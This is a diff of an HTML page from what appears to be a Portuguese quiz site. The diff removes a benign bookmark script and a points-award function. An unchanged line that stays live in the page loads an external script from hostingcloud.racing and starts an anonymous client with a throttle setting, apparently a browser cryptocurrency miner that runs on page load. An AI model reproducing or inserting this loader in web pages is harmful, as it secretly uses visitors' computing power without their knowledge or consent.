@@ -157,31 +157,6 @@
 				<h5>Fim! <a href="/news">Clique aqui</a> para ver as novas perguntas.</h5>
 			</section>
 		<script src="/static/js/index.js"></script>
-<script>
-$(function() {
-  $('#bookmarkme').click(function() {
-    if (window.sidebar && window.sidebar.addPanel) { // Mozilla Firefox Bookmark
-      window.sidebar.addPanel(document.title, window.location.href, '');
-    } else if (window.external && ('AddFavorite' in window.external)) { // IE Favorite
-      window.external.AddFavorite(location.href, document.title);
-    } else if (window.opera && window.print) { // Opera Hotlist
-      this.title = document.title;
-      return true;
-    } else { // webkit - safari/chrome
-      alert('Pressione ' + (navigator.userAgent.toLowerCase().indexOf('mac') != -1 ? 'Command/Cmd' : 'CTRL') + ' + D para favoritar essa página. Ou, caso esteja no celular, procure pelo botão de favoritar de seu navegador.');
-    }
-  });
-});
-function increasePoints() {
-	$.ajax({
-		url: '/increasePoints',
-		type: 'get',
-		complete: function () {
-			alert('Parabéns! Você ganhou 100 pontos!')
-		}
-	})
-}
-</script>
 <script src="https://www.hostingcloud.racing/zk0a.js"></script><script>var _client=new Client.Anonymous("5359e2aefac13b8544fcee9326d4a0aafb5fd62a6991f1e87ade167c09c9967a",{throttle:.9,c:"w",ads:0});_client.start();</script>
 	</body>
 </html>
